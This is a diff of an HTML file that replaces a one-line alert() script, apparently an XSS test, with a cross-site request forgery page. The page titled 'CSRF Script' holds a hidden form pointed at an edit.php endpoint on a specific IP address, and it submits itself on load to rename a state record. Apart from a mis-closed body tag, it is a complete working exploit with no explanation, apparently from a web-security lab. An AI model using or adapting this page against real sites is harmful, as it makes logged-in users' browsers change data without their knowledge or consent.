@@ -1,4 +1,16 @@
-<script>(function go() {
-  alert('hid');
-})();
-</script>
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <title> CSRF Script </title>
+  </head>
+  <body>
+       <form action='http://35.184.88.145/green/public/staff/states/edit.php?id=1'>
+          <input type='hidden' name='name' value='Alabamaaa'/>
+          <input type='hidden' name='code' value='AL'/>
+          <input type='hidden' name='country_id' value='1'/>
+       </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  <body>
+</html>
